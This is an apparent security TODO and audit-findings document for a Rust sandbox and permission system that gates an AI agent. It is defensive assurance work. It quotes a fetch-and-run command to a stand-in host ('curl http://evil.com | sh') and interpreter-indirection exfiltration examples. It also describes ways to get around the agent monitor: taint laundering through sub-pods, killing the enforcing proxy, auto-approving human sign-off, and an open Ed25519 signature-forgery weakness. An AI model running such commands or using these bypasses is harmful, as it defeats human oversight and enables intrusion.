# Security TODOs (Policy -> Physics gaps)

Scope: documents current enforcement gaps and test/assurance deficits across `portcullis`, `nucleus`, and `nucleus-cli`. Each item includes a concrete TODO and a Definition of Done (DoD) that prefers guarantees (fuzzing, property tests, formal methods) when practical.

## 1) Process execution not budget-enforced

Deficiency
- `nucleus::Executor` never charges or checks budget during command execution. Budget is tracked only in `nucleus-cli` after process completion (best-effort). This makes budget enforcement non-atomic with side effects.
Refs: `crates/nucleus/src/command.rs:30`, `crates/nucleus/src/command.rs:73`, `crates/nucleus-cli/src/run.rs:187`

Impact
- A process can run and incur costs even if it should have been blocked for budget exhaustion.

TODO
- Integrate `AtomicBudget` checks into `Executor::run` / `run_with_timeout` before spawning.
- Define a charge model (static per command, or dynamic per output size / duration) and enforce it pre-exec or via reservation.

DoD (guarantees)
- Property tests: budget never exceeds max under concurrent `Executor` usage.
- Fuzz: command strings + randomized budgets must not permit execution when insufficient.
- Negative test: for any budget=0, `Executor::run` must always fail with a budget error.
Status
- Partial: `Executor` reserves budget using a base + per-second model when a time guard/timeout is present; output-based costs and refunds still pending.

## 2) Capability levels are not enforced for file I/O

Deficiency
- `nucleus::Sandbox` checks only `PathLattice` patterns. It does not check `CapabilityLattice` levels (read/write/edit).
Refs: `crates/nucleus/src/sandbox.rs:45`, `crates/nucleus/src/sandbox.rs:218`

Impact
- A policy that forbids `write_files` can still write through `Sandbox::write`, because only path patterns are enforced.

TODO
- Add capability checks to all `Sandbox` methods (read/write/open/create/remove/dir). Decide on a capability mapping table and require it in `Sandbox::new` or per method.

DoD (guarantees)
- Property tests: for any capability state with `write_files < LowRisk`, any write/remove must fail.
- Unit tests: explicit denial for write/edit/remove when `CapabilityLevel::Never` or approval-required without a token.
- If approval callbacks are required, type-level enforcement (guard token) or explicit runtime error must be present.
Status
- Done (runtime): `Sandbox` enforces read/write/edit capabilities with approval callbacks.

## 3) Command exfiltration detection is program-name only

Deficiency
- `Executor::check_uninhabitable` detects network exfiltration by checking the first argv token against a small hardcoded list. `bash -c`, `python -c`, `node -e`, etc. can bypass this.
Refs: `crates/nucleus/src/command.rs:237`, `crates/nucleus/src/command.rs:282`

Impact
-  Uninhabitable state can be completed via indirect shell invocation without detection.

TODO
- Extend detection to include shell-based indirection and common runtime executors.
- Option: disallow `* -c` by default, or treat any `bash/sh/zsh/pwsh/python/node/ruby` as network-capable unless allowlisted.

DoD (guarantees)
- Adversarial tests: `bash -c 'curl ...'`, `python -c '...requests...'`, `node -e '...fetch...'` are blocked under uninhabitable state.
- Fuzz: generate command strings; ensure any network-capable flow under uninhabitable state is denied.
Status
- Partial: default command lattice now blocks common interpreter flags (`bash -c`, `python -c`, `node -e`, etc.); broader coverage and fuzzing pending.

## 4) Command allowlist/blocklist is string-based and permissive mode is bypassable

Deficiency
- `CommandLattice::can_execute` relies on substring checks and `shell_words` tokenization. In permissive mode (empty allowlist), only blocked substrings are enforced.
Refs: `crates/portcullis/src/command.rs:77`, `crates/portcullis/src/command.rs:133`, `crates/portcullis/src/command.rs:191`

Impact
- Command strings with extra args or indirection can bypass intended blocks (e.g., `curl http://evil.com | sh` vs `curl | sh`).

TODO
- Upgrade policy to structured command patterns (program + args) rather than substring matching.
- Consider separate policies for shell, pipelines, and redirection; optionally forbid shell metacharacters entirely.

DoD (guarantees)
- Property tests over parsed argv: forbidden program+arg patterns must never pass even with quoting/spacing.
- Fuzz: command strings with random quoting and separators should not bypass forbidden patterns.
Status
- Partial: added shell metacharacter blocking in permissive mode and subsequence checks for blocked patterns; full structured command patterns still pending.

## 5) ν (nucleus) is not automatically applied to constructed permissions

Deficiency
- `PermissionLattice` can be created via builder or struct literal without normalization. ν is applied only in `meet/join` or if callers manually apply constraint.
Refs: `crates/portcullis/src/lattice.rs:199`, `crates/portcullis/src/lattice.rs:214`, `crates/portcullis/src/lattice.rs:228`, `crates/portcullis/src/lattice.rs:479`

Impact
- Callers can create a permissive lattice that violates the uninhabitable state and use it directly.

TODO
- Provide a `normalize()`/`nucleus()` constructor that applies the constraint and use it in all builders and presets.
- Option: make fields private and require constructors that apply ν.

DoD (guarantees)
- Property tests: `normalize(normalize(x)) == normalize(x)` (idempotent), `x <= y => normalize(x) <= normalize(y)` (monotone), `normalize(x) <= x` (deflationary).
- Construction tests: all public constructors yield `ν(x) = x` (safe).
Status
- Done (runtime): constructors/builders now apply `normalize()` when uninhabitable state is enabled; property tests for ν are added at the capability level.

## 6) Approval requirements are trivially auto-approvable

Deficiency
- Approval obligations can still be automated (e.g., always-approve callbacks), even though execution now requires explicit approval tokens.
Refs: `crates/nucleus/src/command.rs:61`, `crates/nucleus/src/command.rs:383`

Impact
- Human-in-the-loop requirement can be bypassed by callers.

TODO
- Require a structured approval interface (e.g., signed decisions, explicit audit record, or typed approval token).
- Consider making approvals non-bypassable by requiring a guard token that cannot be constructed externally.

DoD (guarantees)
- Compile-time: approval-gated operations require an approval token type that cannot be forged.
- Runtime: approvals must be logged with operation details and a verifier.
Status
- Done (type-level): approval-gated operations require approval tokens (`ApprovalToken`) to execute; callbacks only mint tokens.

## 7) Path sandboxing is string-based in `PathLattice`

Deficiency
- `PathLattice` performs canonicalization and glob matching on strings. Unicode normalization, symlink race conditions, and Windows path oddities are not exhaustively tested.
Refs: `crates/portcullis/src/path.rs:117`, `crates/portcullis/src/path.rs:175`, `crates/portcullis/tests/adversarial.rs:93`

Impact
- Policy checks may be bypassed via path quirks. `Sandbox` mitigates some issues via capability handles, but sensitive-path blocking still relies on strings.

TODO
- Add tests and optional platform-specific normalization (Unicode NFC/NFKC).
- Add symlink-escape tests and ensure behavior is correct on all supported OSes.

DoD (guarantees)
- Fuzz: path inputs (including unicode normalization forms) never permit blocked paths.
- Adversarial tests: symlink escapes and `..` traversal never bypass policy.
Status
- Partial: symlink escape test added for work_dir; unicode/Windows cases and fuzzing pending.

## 8) Enforcement split between `nucleus` and `nucleus-cli`

Deficiency
- `nucleus-cli` spawns `claude` directly and uses `--allowedTools` rather than enforcing via `Executor` and `Sandbox` APIs.
Refs: `crates/nucleus-cli/src/run.rs:111`, `crates/nucleus-cli/src/run.rs:159`

Impact
- Enforcement is policy-as-config; OS-level side effects are not gated by the nucleus runtime in CLI mode.

TODO
- Route tool execution through `nucleus` enforcement layer or implement a wrapper that enforces `Sandbox` and `Executor` for all side effects.

DoD (guarantees)
- Integration tests: commands that violate policy are blocked even if the model attempts them.
- End-to-end tests in CI: forbidden operations never occur in CLI execution.
Status
- Partial: enforced CLI path now runs Claude via MCP + `nucleus-tool-proxy`; unsafe direct mode remains behind `--unsafe-allow-claude`.

## 9) Formalization and proofs are missing

Deficiency
- ν properties (idempotence, monotonicity, deflationary, meet-preserving) are described but not formally verified.
Refs: `crates/portcullis/src/lib.rs:19`, `crates/portcullis/src/lib.rs:26`

Impact
- Subtle regressions can silently break lattice guarantees.

TODO
- Add a small formal spec (Lean/Coq/Isabelle) of the core lattice + ν and map it to Rust.
  See `docs/assurance/formal-methods.md` for the target plan.

DoD (guarantees)
- Machine-checked proofs for ν laws.
- CI gate that fails if proofs no longer check.
Status
- Done: ν-law guarantees (E1-E7: exposure monotonicity, trace monotonicity, denial monotonicity, auth boundary, capability coverage, budget monotonicity, delegation ceiling) are carried by Lean 4 kernel-checked proofs + Kani BMC harnesses (114 repo-wide). **Verus was removed** — there is no `crates/portcullis-verified` and no `.github/workflows/verus.yml`; the surviving artifact is the `verus_conformance.rs` proptest suite. CI proof gates: `kani-nightly.yml` (Kani) and `portcullis-core-proven-lean.yml` (Lean proven-tier `lake build` + `sorry`-ban; fails if proofs no longer check). See `crates/portcullis/tests/verus_conformance.rs`, `.github/workflows/kani-nightly.yml`, `.github/workflows/portcullis-core-proven-lean.yml`.

## 10) Fuzzing coverage gaps

Deficiency
- No `cargo-fuzz` targets for command parsing, path normalization, or policy deserialization.
Refs: `crates/portcullis/tests/proptest_lattice.rs:1`, `Cargo.toml:1`

Impact
- Parser and matcher bugs may allow bypasses or panics in adversarial inputs.

TODO
- Add fuzz targets:
  - `PathLattice::can_access` with random paths and unicode.
  - `CommandLattice::can_execute` with random command strings.
  - `PermissionLattice` serde round-trip.

DoD (guarantees)
- Fuzz CI: minimum corpus size + time budget.
- No crashes, no false-allow for known forbidden patterns.
Status
- Done (CI-gated): 3 fuzz targets (command_can_execute, path_can_access, permission_serde) run in CI with 30s time budget each. Fuzz is a required merge check on main. See `fuzz/`, `.github/workflows/ci.yml`.

## 11) Sub-pod spawn was unmediated by the information-flow monitor (audit C-1 / #1207)

Deficiency
- `create_sub_pod` spawned a child compartment and injected orchestrator credentials without consulting the session `FlowTracker`. A fresh child tracker starts clean, so a parent that had ingested adversarial/web content could launder its accumulated taint across the sub-pod boundary (confused-deputy subagent spawn). The monotonic `session_taint_ceiling` (#1207) and `check_action_safety_with_ceiling` had no production caller on this path.
Refs: `crates/nucleus-tool-proxy/src/pod_mgmt.rs` (`create_sub_pod`, `sub_pod_ifc_gate`)

Impact
- Integrity/confidentiality non-interference held only within the single-process kernel path, not across the sub-pod boundary — a live bypass of "complete mediation".

TODO
- [DONE] Gate `create_sub_pod` on the parent `FlowTracker` via the same egress gate the kernel uses (`portcullis::exposure_core::ifc_egress_denial`, `ManagePods` → `OutboundAction`), failing closed before credential injection or any node call.
- [WON'T-FIX / not-live] Intra-process fresh-tracker leg: `mcp.rs:171` constructs a new `FlowTracker` per MCP server. Audited: this is NOT a live laundering seam because the MCP-stdio and HTTP front-ends are MUTUALLY EXCLUSIVE within one process. `--mcp` is documented as mutually exclusive with the HTTP server (`crates/nucleus-tool-proxy/src/main.rs:256-260`) and, when set, `main.rs:1427` does `return mcp::run_mcp_server(...)` — an early return that exits `main` before the axum HTTP `Router` (and its long-lived per-session `FlowTracker`) is ever constructed. The two `FlowTracker`s are therefore never co-live in one process; there is no intra-process path that resets/replaces a long-lived HTTP tracker with the MCP one mid-session, so there is no taint-laundering boundary to gate. (If a future change makes both front-ends co-live in one process, this leg must be re-opened.)
- [OPEN] Defense in depth: consult `session_taint_ceiling` / `check_action_safety_with_ceiling` in the live integrity gate so per-node `is_tainted()` is not the only check.

DoD (guarantees)
- [DONE] Unit tests (`pod_mgmt::ifc_gate_tests`): a web-tainted parent and a poisoned parent are both denied `IfcDenied`; a clean parent passes. The gate is a private fn called only from `create_sub_pod`, so dropping the call fails the warnings-denied build.
- [OPEN] E2E adversarial-corpus test: over HTTP, taint a session (web_fetch) then attempt `create_sub_pod` and assert deny + no node call + no credential forwarding.

Status
- Partial: the spawn-call-site bypass is closed and regression-tested; the intra-process fresh-tracker leg is closed as WON'T-FIX / not-live (MCP-stdio and HTTP front-ends are mutually exclusive per process — see the leg above), leaving only the ceiling-wiring defense-in-depth open. The "complete mediation now holds" claim is intentionally NOT asserted in README/FORMAL_METHODS until that leg closes.
## 12) Tool-proxy could be OOM-killed by an attacker-controlled response body (audit H-1)

Deficiency
- `web_fetch`, the MCP fetch path, and `web_search` buffered the ENTIRE upstream body (`response.bytes()/.json()`) before applying `web_fetch_max_bytes`, which only truncated what was already allocated. A malicious upstream (the untrusted-content leg of the lethal-trifecta threat model) streaming a huge/Content-Length-lying body caused unbounded allocation → OOM-kill of the tool-proxy. Because the tool-proxy IS the enforcement point, its death runs the agent unmonitored (fail-open).
Refs: `crates/nucleus-tool-proxy/src/main.rs` (`read_body_capped`, web_fetch, web_search), `crates/nucleus-tool-proxy/src/mcp.rs`

TODO
- [DONE] Stream every attacker-influenced body through `read_body_capped`, which stops at `web_fetch_max_bytes` and never retains more than the cap (+ one chunk) regardless of upstream size / Content-Length.
- [DONE] H-3 panic/poison leg — CRITICAL two-class fix (a naive uniform `into_inner()` would turn a fail-closed DoS into a fail-OPEN taint-undercount, which is worse). The two classes:
  - **DECISION locks fail CLOSED, never `into_inner()`.** In `crates/portcullis/src/guard.rs` every `.read()/.write()` on the `exposure` / `executed_ops` accumulators (`RuntimeStateGuard::check` / `execute_and_record` / `accumulated_risk`, `GradedExposureGuard::check` / `execute_and_record` / `accumulated_risk` / `exposure`) now maps a `PoisonError` to a fail-closed denial: `check()` → `GuardError::Denied{reason: "…poisoned…"}`; `execute_and_record()` → `ExecuteError::TocTouDenied` (closure already ran, so the op is treated as denied); `accumulated_risk()` → `StateRisk::Uninhabitable` (max); `exposure()` → the maximal (fully-uninhabitable) `ExposureSet`. RATIONALE: the exposure accumulator is monotone-union (taint only added), so recovering a torn write via `into_inner()` could UNDER-COUNT taint and ALLOW an action that must DENY — a fail-open. Mirrors the kernel poison-gate (`crates/portcullis/src/kernel/ifc.rs:34`, `is_poisoned()`).
  - **AUDIT / METRICS locks RECOVER and continue** (`crates/portcullis/src/audit.rs`, `crates/portcullis/src/metrics.rs`): `.expect("lock poisoned")` → `.unwrap_or_else(|e| e.into_inner())`. RATIONALE: these run AFTER the guarded action (record/metrics); the log is append-only and cannot fabricate/suppress a decision, so a poisoned audit lock must NOT brick recording — recovering accountability is strictly safer here than failing closed.
  - **Router panic net — fail-closed 500.** `tower_http::catch_panic::CatchPanicLayer::custom(fail_closed_panic_response)` added as the OUTERMOST layer (last `.layer()` = outermost/first-to-see-request) on both axum routers: `crates/nucleus-tool-proxy/src/main.rs` and `crates/nucleus-verifier-service/src/app.rs`. The handler returns HTTP 500 DENY, never a reset/allow. `catch-panic` feature enabled on both crates' `tower-http`. (OOM is not catchable by `catch_unwind`; that leg is the bounded allocation above.)

DoD (guarantees)
- [DONE] `read_body_capped_tests` (wiremock): a 4 MiB upstream body against a 64 KiB cap yields exactly the cap with `truncated=true`; a small body round-trips untruncated. Fails if reverted to whole-body buffering.
- [DONE] `guard::tests::test_decision_lock_poison_denies_graded_check` / `…_runtime_check` / `…_execute_and_record_fails_closed` (portcullis): poison the `exposure` decision lock (panic while holding the write guard via `catch_unwind`), then assert `check()`/`execute_and_record()` return a fail-CLOSED deny — NOT a panic, NOT an allow, NOT a torn-state allow. These FAIL if anyone swaps `into_inner()` onto a decision lock (it would return `Ok`). Serves as the H-3 adversarial regression (the IFC-flow JSON corpus can't express fault injection).
- [DONE] `audit::tests::test_audit_lock_poison_recovers_and_records` (portcullis): poison the audit lock, then `record(...)` still appends (seq 2, total 2) without panicking — recover-and-continue.
- [DONE] `panic_net_tests::panicking_handler_returns_fail_closed_500_and_keeps_serving` (nucleus-tool-proxy + nucleus-verifier-service): a request to a panicking route behind `CatchPanicLayer` returns HTTP 500 (fail-closed), and a subsequent normal request still returns 200.

Status
- [DONE] Both legs closed and regression-tested: the OOM/allocation leg (bounded `read_body_capped`) and the panic/poison leg (H-3, two-class lock policy + router panic net). Still does NOT claim "monitor is un-killable" (SIGKILL / OOM-kill of the process is out of scope for `catch_unwind`).

## 13) Transparency-log cosignature not enforced on the production trust path (audit C-3) — ESCALATED, DEFERRED

Deficiency
- `verify_binding_in_log` (witness-cosigned STH + inclusion proof) is called only in tests; the production `federation.rs` path (`apply_to_store`) authenticates inbound JWT-SVIDs directly from the on-disk `FederationSet` with no cosignature check. Anyone who can write the registry tree gets keys served for identity verification (forged foreign identities authenticate). This is the highest-severity remaining finding.
Refs: `crates/nucleus-trust-registry/src/federation.rs:25-48`, `tlog.rs` (`verify_binding_in_log`)

Status
- DEFERRED by owner decision (2026-07-17). Enforcement establishes a NEW TRUST ROOT (which pinned witness cosigner(s), out-of-band key distribution) and a BREAKING CHANGE (deployments lacking a `SealedLog` must be rejected). Both the witness model (single vs k-of-n) and the rollout (hard fail-closed vs warn-then-enforce) are open owner decisions; do not wire enforcement until decided. Kept as the top open critical.

## 14) Ed25519 re-verify used non-strict `verify()` on three trust-path sites (audit M-2)

Deficiency
- Three Ed25519 re-verify sites on the trust path called non-strict `vk.verify(...)` instead of `vk.verify_strict(...)`. Non-strict verification uses the cofactored equation and does not reject small-order / non-canonical public keys, so a single signature can verify under multiple identities (key-substitution / weak binding). The core already used `verify_strict`; these three were the inconsistency.
Refs: `crates/nucleus-receipt/src/lib.rs:187` (`Receipt::verify`), `crates/nucleus-verifier-service/src/auth.rs:86` (`verify_detached_ed25519`), `crates/nucleus-witness/src/cosign.rs:134` (`verify_cosign_line`).

Impact
- On the receipt colimit-identity path, the detached-signature agent-auth path, and the witness cosignature path, an attacker presenting the Ed25519 identity/neutral key could get a crafted "identity-triple" signature to verify, breaking strong binding of signature → identity.

TODO
- [DONE] Swapped all three sites from `vk.verify(msg, &sig)` to `vk.verify_strict(msg, &sig)` (each `vk` is an `ed25519_dalek::VerifyingKey`; same call signature, strictly stronger — rejects small-order/non-canonical A and R). Removed the now-unused `ed25519_dalek::Verifier` trait import from each of the three modules (`verify_strict` is an inherent method).

Strong-binding rationale + tests
- [DONE] Regression tests prove strong binding at EACH site (one per crate), each with two assertions: (i) an honest dalek keypair still verifies through the site's public path (no regression); (ii) a signature presented against the SMALL-ORDER Ed25519 identity/neutral verifying key (`[1, 0, …, 0]`) with the identity-triple signature (`R` = identity encoding, `s` = 0) is REJECTED. That triple satisfies the cofactored verification equation for every message, so non-strict `verify()` ACCEPTS it while `verify_strict()` rejects it — empirically confirmed under the pinned `ed25519-dalek =3.0.0-pre.7` (a standalone run showed `verify().is_ok() == true` AND `verify_strict().is_err() == true` for the identity triple). Each site test FAILS if the site is reverted to non-strict `verify()` (verified by temporarily reverting `nucleus-receipt`, whose test then panicked on assertion (ii)).
  - `crates/nucleus-receipt/src/lib.rs` → `tests::small_order_key_is_rejected_by_verify_strict`
  - `crates/nucleus-verifier-service/src/auth.rs` → `auth::tests::small_order_key_is_rejected_by_verify_strict`
  - `crates/nucleus-witness/src/cosign.rs` → `cosign::tests::small_order_key_is_rejected_by_verify_strict`
- Note: the three crates have no dedicated adversarial/small-order corpus module to extend; the small-order case is carried by the per-site unit tests above.

Status
- [DONE] All three sites use `verify_strict`; new + existing suites pass (`cargo test -p nucleus-receipt -p nucleus-verifier-service -p nucleus-witness`), `cargo fmt` clean, `cargo clippy` on the three crates has no new warnings.
- SUBSUMED by item 15 (audit M-3), which completes the whole class (every remaining dalek trust-path re-verify) and adds a CI grep-gate so the property cannot silently regress. The three M-2 sites and their tests are unchanged and remain covered by the gate.

## 15) Ed25519 non-strict `verify()` — remainder of the class + CI ratchet (audit M-3)

Deficiency
- Beyond the three M-2 sites, the rest of the codebase still had `ed25519_dalek::VerifyingKey::verify(msg, &sig)` (non-strict, cofactored) on production trust paths. Non-strict verification accepts small-order / non-canonical public keys and `R` points, so the Ed25519 identity/neutral key with an "identity-triple" signature verifies under any message → key-substitution / weak signature-to-identity binding. M-3 finishes the class (converts every remaining dalek site to `verify_strict`) and installs a durable CI gate.

TODO — conversions (all [DONE])
- Swapped `vk.verify(msg, &sig)` → `vk.verify_strict(msg, &sig)` at every production dalek trust-path re-verify below, and removed the now-unused `ed25519_dalek::Verifier` trait import from each module (`verify_strict` is an inherent method, so the deny-warnings build stays clean). `verify_strict` is strictly stronger — it additionally rejects small-order/non-canonical `A` and `R`.
  - `crates/nucleus-verifier-service/src/witness.rs:162` (peer STH cosignature verify)
  - `crates/nucleus-witness/src/server.rs:249` (trusted-key STH signature verify)
  - `crates/nucleus-oidc-provider/src/token.rs:237` (subject_token / JWT-SVID — identity trust root)
  - `crates/nucleus-provenance/src/lib.rs:230` (DSSE attestation signature verify)
  - `crates/nucleus-node-binding/src/lib.rs:148` (node↔principal passport binding verify)
  - `crates/nucleus-provenance-memory/src/declassify.rs:172` (threshold human-auth declassify cosignature — HIGH value)
  - `crates/nucleus-control-plane-server/src/auth.rs:259` (control-plane JWT-SVID auth — identity trust root; found by workspace sweep, not in the original M-3 list)
  - `crates/nucleus-externality/src/claim.rs:137` (oracle claim signature verify; found by sweep)
  - `crates/nucleus-witness-gossip/src/lib.rs:119` (`verify_head` cosignature/v1 verify; found by sweep)
  - `crates/nucleus-witness-olog/src/pin.rs:139` (pinned-log checkpoint signature verify; found by sweep)
  - `crates/nucleus-witness-olog/src/manifest.rs:140` (accumulation-manifest signature verify; found by sweep)
  - `crates/nucleus-witness-olog/src/bond.rs:200` (bond evidence signature verify; found by sweep)

Wrapper `.verify(...)` methods traced to their inner dalek call — already strict, no change:
- `nucleus-receipt::Receipt::verify` (`lib.rs:187`, from M-2), reached via `nucleus-recompute::verify_signed_clearing` and `nucleus-agent-card` e2e — inner call is `verify_strict`.
- `nucleus-lineage::SignedTreeHead::verify` → `Ed25519Witness::verify_canonical` (`checkpoint.rs:273,308`) — `verify_strict`. Reached via `nucleus-lineage::merkle::verify_log` and `nucleus-envelope::verify.rs:904`.

SKIPs (with justification)
- Every `portcullis` verify site — `certificate.rs` (authority/block/PoP ~923/949/983), `token_sign.rs:50`, `receipt_sign.rs:72`, `manifest_registry.rs:99/141` — and `nucleus-identity::approval_bundle.rs:425` (reached via `nucleus-tool-proxy/src/main.rs:583`): these verify with **`ring` (`UnparsedPublicKey` + `signature::ED25519`), not `ed25519-dalek`**. `ring` exposes no `verify_strict`, so the M-3 mechanism does not apply. NOTE: these are NOT already safe — see the sibling finding below.
- `crates/nucleus-agent-card/src/jwk.rs:134`: **P-256 ECDSA (ES256)** via `p256::ecdsa` (`VerifyingKey::from_sec1_bytes`), not Ed25519.
- `portcullis` `galois.rs` / `intent.rs` `connection.verify(l, r)` / `bridge.verify(...)`: Galois-connection lattice check, not a signature verify.
- `portcullis` `escalation.rs` / `receipt_chain.rs` / `token.rs` `chain.verify()` / `token.verify(now, depth)`: hash-chain + ring signature wrappers, no dalek path.
- Test-only dalek `.verify(...)`: `nucleus-oidc-provider` `issuer.rs:686`, `keystore/memory.rs:238/275`, `keystore/rotator.rs:240`; `nucleus-lineage/src/file_signer.rs:145`; and all `crates/*/tests/` integration tests. `#[cfg(test)]` / test-dir only — not a production trust path.
- Signing (not verifying) calls (`.sign(...)`): out of scope by definition.

CI grep-gate (the durable ratchet) — [DONE]
- `scripts/check-verify-strict.sh` (+ commented allowlist `scripts/verify-strict-allowlist.txt`), wired into `.github/workflows/ci.yml` as job `verify-strict` ("Ed25519 verify_strict gate (M-3)"). It scans only files importing `ed25519_dalek`, strips `#[cfg(test)]` blocks and `tests/`/`benches/` dirs and comment lines, and FAILS (exit 1) on any two-argument `.verify(_, &sig)` that is not `verify_strict` and not in the allowlist. Prefers `rg`, falls back to POSIX `grep`.
- PROVEN TO BITE: planting `.verify(&canonical_claim_bytes(claim), &sig)` back into `nucleus-externality/src/claim.rs` made the gate exit 1 and print the offending `file:line`; removing the plant returned it to exit 0 / PASSED.

Regression tests (identity-triple, `[1,0,…,0]` key + `R=identity‖s=0`) — [DONE]
- Three crown-jewel dalek paths, each driven through the site's REAL public function, each with (i) honest signature still verifies and (ii) identity-triple REFUSED; each FAILS if its site is reverted to non-strict (verified by temporary revert → assertion panic):
  - `crates/nucleus-oidc-provider/src/token.rs` → `token::tests::small_order_key_is_rejected_by_verify_strict` (full token-exchange handler; forged token otherwise valid → 400 invalid_grant under strict, would be 200 under non-strict).
  - `crates/nucleus-provenance-memory/src/declassify.rs` → `declassify::tests::small_order_key_is_rejected_by_verify_strict` (threshold declassify; forged cosignature must not reach the quorum).
  - `crates/nucleus-control-plane-server/src/auth.rs` → `auth::tests::small_order_key_is_rejected_by_verify_strict` (JWT-SVID auth; forged principal must be rejected). NOTE: substituted for the originally-suggested "portcullis certificate verify", which is a `ring` path (see sibling finding) with no `verify_strict` to guard.

Status
- [DONE] All 12 dalek sites use `verify_strict`; CI-gated by `scripts/check-verify-strict.sh`. `cargo test` green on all touched crates (`nucleus-node-binding`, `nucleus-verifier-service`, `nucleus-provenance`, `nucleus-oidc-provider`, `nucleus-provenance-memory`, `nucleus-witness`, `nucleus-witness-gossip`, `nucleus-witness-olog`, `nucleus-control-plane-server`, `nucleus-externality`); `cargo fmt --all --check` clean; `cargo clippy --all-targets -- -D warnings` clean on all touched crates.

## 16) [SIBLING of M-3, NEW — needs owner triage] `ring` Ed25519 trust-path verifies accept small-order/identity-triple signatures

Deficiency
- The `ring`-backed Ed25519 verifies (portcullis `certificate.rs`, `token_sign.rs`, `receipt_sign.rs`, `manifest_registry.rs`; `nucleus-identity::approval_bundle.rs`) have the SAME weak-binding weakness M-3 fixes for dalek, and it is NOT fixable with `verify_strict` (ring has no such API). Empirically confirmed under the repo's pinned `ring`: `UnparsedPublicKey::new(&signature::ED25519, [1,0,…,0]).verify(b"any message", &identity_triple)` returns `Ok` (`RING_DIRECT_IDENTITY_TRIPLE_ACCEPTED = true`), and `verify_certificate` with the identity root key passed the authority-signature check (it only later failed proof-of-possession because mutating the signature changed the block hash). So a delegation chain whose in-band `next_key` is set to the identity key can have the next hop "signed" by nobody, and any trust anchor pinned to the identity key is forgeable.
- Exploitability varies by site: certificate DELEGATION `next_key` travels in-band (attacker-influenced) → highest concern; `verify_certificate` root key, `TrustStore`, and token/receipt keys are caller-pinned (lower, but still weak-binding).

TODO
- [ ] Owner decision required — not fixed here (out of M-3's stated dalek/`verify_strict` scope; it is a load-bearing crypto change). Options: (a) add an explicit small-order/canonical-encoding rejection of the public key and `R` around each ring verify; or (b) migrate these trust-path verifies to `ed25519-dalek::verify_strict`. Either way, extend `scripts/check-verify-strict.sh` to cover the ring paths once a canonical form is chosen.

Status
- [OPEN] Reported by the M-3 sweep; deliberately left unfixed pending owner triage.
